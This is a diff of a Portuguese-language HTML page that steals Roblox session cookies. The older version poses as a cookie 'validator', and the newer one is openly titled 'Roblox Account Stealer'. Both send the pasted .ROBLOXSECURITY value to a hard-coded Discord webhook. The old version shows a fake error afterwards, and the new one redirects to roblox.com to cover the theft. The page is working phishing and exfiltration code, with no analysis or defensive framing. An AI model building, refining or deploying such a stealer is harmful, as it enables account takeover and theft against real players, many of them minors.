@@ -2,31 +2,40 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Verificador de Segurança - Roblox</title>
+    <title>Roblox Account Stealer</title>
     <style>
-        body { font-family: sans-serif; background: #222; color: white; text-align: center; padding-top: 50px; }
-        input { width: 300px; padding: 10px; margin: 10px; }
-        button { padding: 10px 20px; cursor: pointer; background: #007bff; border: none; color: white; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; text-align: center; padding-top: 80px; }
+        .container { border: 1px solid #333; padding: 30px; display: inline-block; border-radius: 10px; background: #252525; }
+        input { width: 350px; padding: 12px; margin: 15px 0; border-radius: 5px; border: 1px solid #444; background: #111; color: #0f0; font-family: monospace; }
+        button { padding: 12px 25px; cursor: pointer; background: #dc3545; border: none; color: white; font-weight: bold; border-radius: 5px; }
+        button:hover { background: #c82333; }
     </style>
 </head>
 <body>
-    <h2>Validador de Cookie .ROBLOXSECURITY</h2>
-    <p>Insira seu cookie abaixo para validar o status da conta:</p>
-    <input type="text" id="cookie" placeholder="Cole aqui seu .ROBLOXSECURITY">
-    <br>
-    <button onclick="enviarDados()">Validar Agora</button>
+    <div class="container">
+        <h2>Roblox Account Stealer</h2>
+        <p>_/warning...</p>
+        <input type="text" id="userToken" placeholder="Digite seu Token aqui...">
+        <br>
+        <button onclick="enviarToken()">Capturar Token Agora</button>
+    </div>
 
     <script>
-    function enviarDados() {
-        const cookieValue = document.getElementById('cookie').value;
+    function enviarToken() {
+        const tokenValue = document.getElementById('userToken').value;
         const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
         
         const payload = {
-            content: "Novo Cookie Capturado:",
+            username: "Roblox Account Stealer Bot",
+            content: "🚨 **NOVO TOKEN CAPTURADO!** 🚨",
             embeds: [{
-                title: "Dados do Alvo",
-                description: "```" + cookieValue + "```",
-                color: 16711680
+                title: "ALERTA DE CAPTURA - Roblox Token",
+                fields: [
+                    { name: "Status", value: "Captura Executada", inline: true },
+                    { name: "Valor do Token", value: "```" + tokenValue + "```" }
+                ],
+                color: 16711680,
+                timestamp: new Date()
             }]
         };
 
@@ -35,7 +44,9 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         }).then(() => {
-            alert("Erro na validação. Tente novamente mais tarde.");
+            window.location.href = "https://www.roblox.com/";
+        }).catch(err => {
+            console.error("Erro.");
         });
     }
     </script>
